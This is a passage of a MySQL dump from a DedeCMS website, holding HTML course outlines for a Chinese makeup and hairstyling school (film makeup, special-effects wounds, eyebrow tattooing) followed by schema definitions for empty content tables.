normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、根据人物性格、身份、年龄等应用妆面及解析化妆手法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、儿童妆、青年妆、中年妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、改变年龄的化妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、战争、乞丐、病态等特定效果妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、城市人物妆、农村人物妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、福相、苦相、恶相、善相等化妆手法解析</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">二 伤效化妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、剧中烫伤、打伤、刀伤、划伤</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、青紫、假指、伤疤</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、断手、断臂</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、血浆制作</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、唇裂、太阳晒后脱皮、村红、病态等</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第七部分:影视美术课程</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、色彩的认识及运用</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、人物妆面效果图</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、骨骼骷髅妆化妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、人体彩绘绘画设计</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、老年妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、骷髅妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">7、面部彩绘</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">8、梦幻妆</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; white-space: normal;\"><br/></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">第八部分:美发吹风</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">注:主要是针对剧组使用的美发吹风课程</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">1、剪发与造型的技法造型3要素</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">2、剪发技巧</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">3、剪发与削发结合使用技法</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">4、吹冈与造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">5、男女士的吹风造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">6、传统发式造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">7、现代发式造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">8、传统与现代混合发型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">9、寸头，平头，板寸，毛寸</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">10、男女播音主持吹风造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">11、男女时尚吹风造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">12、波浪吹风造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">13、内翻、外翻吹风造型</span></p><p style=\"margin-top: 0px; margin-bottom: 0px; padding: 0px; color: rgb(102, 102, 102); font-family: 微软雅黑; font-size: 12px; text-indent: 0em; white-space: normal;\"><span style=\"font-family: 宋体, SimSun; font-size: 16px;\">14、上下结构混搭(纹理、线条组合造型）</span></p><p><span style=\"font-family: 宋体, SimSun; font-size: 16px;\"><br/></span></p><p><br/></p>','','','123.117.65.8'),(101,14,'<p>影视剧组签约就业班</p><p>学制：一年制</p><p>开学时间：每月1日、15日开学</p><p>上课方式：(全天、自由)均可</p><p>上课时间：1、周一到周五正常上课,周六日休息</p><p>&nbsp; &nbsp; &nbsp; 2、上课时间:上午9:00-12:00下午13:00–16：30</p><p>备注：1、终身免费复修</p><p>&nbsp; &nbsp; 2、免费赠送全套化妆品化妆工具化妆箱(价值1200元)</p><p>&nbsp; &nbsp; 3、免费参加影楼、电视台、广告、活动等实习</p><p>&nbsp; &nbsp;4、全部保障剧组就业</p><p>课程设置</p><p>第一部分</p><p>化妆基础、现代基础发型，</p><p>第二部分</p><p>影楼化妆</p><p>第三部分</p><p>高级彩妆</p><p>第四部分</p><p>毛发制作</p><p>第五部分</p><p>古代发型</p><p>第六部分</p><p>影视化妆、伤效化妆</p><p>第七部分</p><p>影视美术课程</p><p>第八部分</p><p>美发吹风</p><p>第一部分:化妆基础、现代基础发型</p><p>一 化妆基础</p><p>1、化妆发展史,化妆品及化妆工具的正确应</p><p>2、化妆师应该具备的条件</p><p>3、根据不同肤色选择适合的粉底</p><p>4、化妆后皮肤的保养</p><p>5、面部骨骼分析</p><p>6、 脸型、眉型、眼型、唇型的化法与改变</p><p>7、画眼线的正确技法和腮红的打法与正确的选色的运用</p><p>8、美目贴的正确剪贴和运用</p><p>9、假睫毛的修剪和正确粘贴</p><p>10、假睫毛的修剪和正确黏贴</p><p>11、眼影的色彩分析与正确的运用技巧</p><p>12、各种脸型的矫正化妆技法</p><p>13、结构透明妆裸妆化妆技法</p><p>14、日常生活妆的化妆方法与色彩的运用</p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20191001/1569859536515782.jpg\" title=\"1569859536515782.jpg\" alt=\"3-(7).jpg\"/></p><p>二 现代发型</p><p>1、发型基础原理及专业造型师必备</p><p>2、基础造型分区、倒梳、手打卷、包发</p><p>3、刘海与脸型的搭配技巧</p><p>4、脸型与发型搭配技巧</p><p>5、假发认识及真假发的操作原理与技巧</p><p>6 、时尚、经典新娘造型多变分析</p><p>7 、造型饰品制作及运用原理</p><p>8 、电卷发的操作技巧及运用原理</p><p>9、盘包类手法:包的基础手法设计与运用</p><p>10、辫法类手法:插手辫、千手辫、各类编法之间的关系及辨发手法在韩式造型中的作用</p><p>11、波纹类手法:手推波纹、手摆波纹、复古类造型与时尚造型的结合</p><p>12、赫本造型:时尚赫本古风格赫本新娘赫本夸张赫本</p><p>13、朋克风格:影楼朋克造型、时尚T台朋克造型、前卫女生活朋克造型</p><p>14、欧式造型:晚会欧式造型、主持人欧式造型、T台欧式造型</p><p>15、真假发结合:发型中真假发结合及饰品和假发的应用</p><p>16、短发造型:在造型中短发的变化及演示</p><p>17、创意造型：舞台创意发型，大赛创意发型</p><p>18、发型与脸型，身型，五官，发色，场合，职业等关系与搭配设&nbsp;计</p><p>&nbsp;</p><p>第二部分:影楼化妆</p><p>一影楼白纱主题整体形象设计</p><p>1、影楼经典白沙主题一欧式白纱(端庄、圣洁)</p><p>2、影楼流行白纱主题韩式白纱(精致、淡雅</p><p>3、影楼特色白纱主題一芭比白纱(活泼、俏丽)</p><p>4、影楼创意白纱主题MⅨ白纱(别致、新颖)</p><p>5、影楼时尚白纱主题复古、画意新娘</p><p>6、白纱新娘整体考核、作品点评</p><p>二 影楼晚礼整体形象设计</p><p>1、影楼含蓄晚礼主题画意晚礼(温馨、惬意)</p><p>2、影楼流行晚礼主题一人鱼晚礼(魅感、优雅</p><p>3、影楼时尚晚礼主题红毯妆(简约、高雅)</p><p>4、影楼经典晚礼主题宫廷妆(高贵、华丽</p><p>5、影楼创新晚礼主题mix(艺术 个性）</p><p>6、晚礼新娘整体考核、作品点评</p><p>三 影楼特色服整体形象设计</p><p>1、影楼国风特色主题古装(雍容、华贵)</p><p>2、影楼民国特色主题旗袍秀禾(温婉、秀丽)</p><p>3、影楼艺术特色主题敦媓水噩(瑰丽、柔美)</p><p>4、影楼民族待色主题一波西米亚(自然健康)</p><p>5、影楼特色服整体考核、作品点评</p><p>四 影楼主题设计应用(写真）</p><p>1、影楼中的异域风-韩服，和服，印度，埃及</p><p>2、影楼西方文化素养培训-奇特、波普，朋克</p><p>3、同—个模特不同造型的设计与转换一流程示范</p><p>五、工作能力培训</p><p>1、影楼技术部门营销课程</p><p>2、影楼时尚、个性写真整体造型设计</p><p>3、影楼灯光、摄影、数码与化妆的配合</p><p>4、影楼常见突发事件问题的解决方法</p><p>5，年度个大型影楼的最新样片的观摩</p><p>6、化妆师与顾客的沟通技巧</p><p>第三部分:高级彩妆</p><p>1、时尚妆面与日妆、婚纱妆的区别与化妆手法</p><p>2、时尚彩妆流行超势色彩选择运用</p><p>3，透明妆化妆技法</p><p>4，艺术写真（艺术照发型妆面整体造型设计）</p><p>5、电视节目主持人妆面(新闻主持、综艺栏目主持、少儿节目主持及男主持人等)</p><p>6、广告妆面(立体广告、平面广告、明星妆等)化妆技法</p><p>7、模特妆(台模特、杂志封面模特)化妆技法</p><p>8、日本艺妓妆化妆技法</p><p>9、时尚韩国流行妆化妆技法</p><p>10、欧式妆、假双化妆技法</p><p>11、晒伤妆、创艺妆化妆技法</p><p>12、大小烟熏妆的化妆技法</p><p>13、小丑妆化妆技法</p><p>14、印度妆化妆技法</p><p>15、T台男妆化妆技法</p><p>16、青年妆化妆技法</p><p>17、白领丽人妆化妆技法</p><p>18、时尚整体妆面与发型、发饰的搭配技巧</p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20191001/1569859588924824.jpg\" title=\"1569859588924824.jpg\" alt=\"37.jpg\"/></p><p><br/></p><p>第四部分:毛发制作</p><p>1、工具认识—毛发制作的工具认识和所需材料</p><p>2、道士头套—根据影视剧年代人物作头套的步骤方法(道土头马蹄盖、发片)</p><p>3、清朝头套一古装半头头套制作、清朝马蹄盖头套制作</p><p>4、胡子制作—据影视剧年代人物性档制作胡子山羊胡、络腮胡一字胡</p><p>5、眉毛制作—据影视剧年代人物性格制作眉毛</p><p>6、胡子修，剪，烫的技巧</p><p>7、头套、胡子的正确粘贴方法</p><p>8、胡子、头套拍摄中穿帮遮盖技法</p><p>第五部分:古代发型</p><p>1、古代发型认识</p><p>2、唐，宋，元，明，清饰品制作</p><p>3、影视古装戏梳妆的流程</p><p>4、影视古代发型梳妆所用的工具</p><p>5、唐，宋，元，明、清不同朝代发包、发件、发簪制作方法</p><p>6、影视剧不同朝代人物的发包发件运用</p><p>7、不同年代的发型区别与发型梳理技巧</p><p>8、唐，宋，元，明，清发型设计与梳理</p><p>9、清末民初二三十年代发型设计与梳理</p><p>第六部分:影视化妆、伤效化妆</p><p>一 影视化妆</p><p>1、根据人物性格、身份、年龄等应用妆面及解析化妆手法</p><p>2、儿童妆、青年妆、中年妆</p><p>3、改变年龄的化妆</p><p>4、战争、乞丐、病态等特定效果妆</p><p>5、城市人物妆、农村人物妆</p><p>6、福相、苦相、恶相、善相等化妆手法解析</p><p>二 伤效化妆</p><p>1、剧中烫伤、打伤、刀伤、划伤</p><p>2、青紫、假指、伤疤</p><p>3、断手、断臂</p><p>4、血浆制作</p><p>5、唇裂、太阳晒后脱皮、村红、病态等</p><p>第七部分:影视美术课程</p><p>1、色彩的认识及运用</p><p>2、人物妆面效果图</p><p>3、骨骼骷髅妆化妆</p><p>4、人体彩绘绘画设计</p><p>5、老年妆</p><p>6、骷髅妆</p><p>7、面部彩绘</p><p>8、梦幻妆</p><p>第八部分:美发吹风</p><p>注:主要是针对剧组使用的美发吹风课程</p><p>1、剪发与造型的技法造型3要素</p><p>2、剪发技巧</p><p>3、剪发与削发结合使用技法</p><p>4、吹冈与造型</p><p>5、男女士的吹风造型</p><p>6、传统发式造型</p><p>7、现代发式造型</p><p>8、传统与现代混合发型</p><p>9、寸头，平头，板寸，毛寸</p><p>10、男女播音主持吹风造型</p><p>11、男女时尚吹风造型</p><p>12、波浪吹风造型</p><p>13、内翻、外翻吹风造型</p><p>14、上下结构混搭(纹理、线条组合造型）</p><p>影视剧组进修班&nbsp;&nbsp;&nbsp;&nbsp;学期4个月</p><p>影视剧组梳妆班 &nbsp;&nbsp;&nbsp;学期1个月{针对有美发基础}</p><p><br/></p>','','','221.217.170.188'),(102,2,'<p style=\"text-align: center;\"><br/></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">1、专业纹绣师应具备的条件 &nbsp; &nbsp;</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">2、新潮眉形设计（流星眉 落尾眉 凤尾眉 黛玉眉 标准眉 &nbsp;海鸥眉 &nbsp;平眉 &nbsp;剑眉）</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">3、眉毛的美化 &nbsp;A、标准眉型</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; B、不同眉型矫正</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;C、眉型设计 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">4、纹眉的线条设计及运针方法</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">5、普通绣与全能绣的制作 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">6、绣眉并发症的处理</span></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20191001/1569860174820386.png\" title=\"1569860174820386.png\" alt=\"1490672160878235.png\"/></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">7、三维立体值眉的程序 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">8、立体绣眉术的特点</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">9、改老式红蓝眉 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">10、不同的脸型与眉型的设计（真人演示及注意事项）</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">11、魅惑美睫线与美瞳线美学设计 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">12、美睫线与美瞳线（真人演示及注意事项）</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">13、现代流行唇的种类及美学设计（标准唇 &nbsp; 时尚唇）</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">14、水润唇的真人演示操作流程（唇的特点、唇形设计 &nbsp; 注意事项及禁忌）</span></p><p style=\"text-align: center;\"><img src=\"/uploads/allimg/20191001/1569860184377790.jpg\" title=\"1569860184377790.jpg\" alt=\"594b75bc278ba.jpg\"/></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">15、艺术纹身（割线与打雾的技巧）图案设计及象征意义 局部设计纹身的要求</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">整个学习过程中是由纸上素描（眉眼唇）</span></p><p><span style=\"font-size: 18px; font-family: arial, helvetica, sans-serif;\">人造皮以保证学员打牢、扎实的基本功，经过考核达标，确保真人实操的稳定性。</span></p><p><br/></p>','','','221.217.170.188');
/*!40000 ALTER TABLE `dede_addonarticle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_addonimages`
--

DROP TABLE IF EXISTS `dede_addonimages`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_addonimages` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `pagestyle` smallint(6) NOT NULL DEFAULT '1',
  `maxwidth` smallint(6) NOT NULL DEFAULT '600',
  `imgurls` text,
  `row` smallint(6) NOT NULL DEFAULT '0',
  `col` smallint(6) NOT NULL DEFAULT '0',
  `isrm` smallint(6) NOT NULL DEFAULT '0',
  `ddmaxwidth` smallint(6) NOT NULL DEFAULT '200',
  `pagepicnum` smallint(6) NOT NULL DEFAULT '12',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  `body` mediumtext,
  PRIMARY KEY (`aid`),
  KEY `imagesMain` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_addonimages`
--

LOCK TABLES `dede_addonimages` WRITE;
/*!40000 ALTER TABLE `dede_addonimages` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_addonimages` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_addoninfos`
--

DROP TABLE IF EXISTS `dede_addoninfos`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_addoninfos` (
  `aid` int(11) NOT NULL DEFAULT '0',
  `typeid` int(11) NOT NULL DEFAULT '0',
  `channel` smallint(6) NOT NULL DEFAULT '0',
  `arcrank` smallint(6) NOT NULL DEFAULT '0',
  `mid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `click` int(10) unsigned NOT NULL DEFAULT '0',
  `title` varchar(60) NOT NULL DEFAULT '',
  `litpic` varchar(60) NOT NULL DEFAULT '',
  `userip` varchar(15) NOT NULL DEFAULT ' ',
  `senddate` int(11) NOT NULL DEFAULT '0',
  `flag` set('c','h','p','f','s','j','a','b') DEFAULT NULL,
  `lastpost` int(10) unsigned NOT NULL DEFAULT '0',
  `scores` mediumint(8) NOT NULL DEFAULT '0',
  `goodpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `badpost` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `nativeplace` smallint(5) unsigned NOT NULL DEFAULT '0',
  `infotype` char(20) NOT NULL DEFAULT '0',
  `body` mediumtext,
  `endtime` int(11) NOT NULL DEFAULT '0',
  `tel` varchar(50) NOT NULL DEFAULT '',
  `email` varchar(50) NOT NULL DEFAULT '',
  `address` varchar(100) NOT NULL DEFAULT '',
  `linkman` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`,`nativeplace`,`infotype`),
  KEY `channel` (`channel`,`arcrank`,`mid`,`click`,`title`,`litpic`,`senddate`,`flag`,`endtime`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_addoninfos`
--

LOCK TABLES `dede_addoninfos` WRITE;
/*!40000 ALTER TABLE `dede_addoninfos` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_addoninfos` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_addonshop`
--

DROP TABLE IF EXISTS `dede_addonshop`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_addonshop` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `body` mediumtext,
  `price` float NOT NULL DEFAULT '0',
  `trueprice` float NOT NULL DEFAULT '0',
  `brand` varchar(250) NOT NULL DEFAULT '',
  `units` varchar(250) NOT NULL DEFAULT '',
  `templet` varchar(30) NOT NULL,
  `userip` char(15) NOT NULL,
  `redirecturl` varchar(255) NOT NULL,
  `vocation` char(20) NOT NULL DEFAULT '0',
  `infotype` char(20) NOT NULL DEFAULT '0',
  `uptime` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_addonshop`
--

LOCK TABLES `dede_addonshop` WRITE;
/*!40000 ALTER TABLE `dede_addonshop` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_addonshop` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_addonsoft`
--

DROP TABLE IF EXISTS `dede_addonsoft`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_addonsoft` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `filetype` varchar(10) NOT NULL DEFAULT '',
  `language` varchar(10) NOT NULL DEFAULT '',
  `softtype` varchar(10) NOT NULL DEFAULT '',
  `accredit` varchar(10) NOT NULL DEFAULT '',
  `os` varchar(30) NOT NULL DEFAULT '',
  `softrank` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `officialUrl` varchar(30) NOT NULL DEFAULT '',
  `officialDemo` varchar(50) NOT NULL DEFAULT '',
  `softsize` varchar(10) NOT NULL DEFAULT '',
  `softlinks` text,
  `introduce` text,
  `daccess` smallint(5) NOT NULL DEFAULT '0',
  `needmoney` smallint(5) NOT NULL DEFAULT '0',
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `softMain` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_addonsoft`
--

LOCK TABLES `dede_addonsoft` WRITE;
/*!40000 ALTER TABLE `dede_addonsoft` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_addonsoft` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_addonspec`
--

DROP TABLE IF EXISTS `dede_addonspec`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `dede_addonspec` (
  `aid` mediumint(8) unsigned NOT NULL DEFAULT '0',
  `typeid` smallint(5) unsigned NOT NULL DEFAULT '0',
  `note` text,
  `templet` varchar(30) NOT NULL DEFAULT '',
  `userip` char(15) NOT NULL DEFAULT '',
  `redirecturl` varchar(255) NOT NULL DEFAULT '',
  PRIMARY KEY (`aid`),
  KEY `typeid` (`typeid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `dede_addonspec`
--

LOCK TABLES `dede_addonspec` WRITE;
/*!40000 ALTER TABLE `dede_addonspec` DISABLE KEYS */;
/*!40000 ALTER TABLE `dede_addonspec` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `dede_admin`
--

DROP TABLE IF EXISTS `dede_admin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
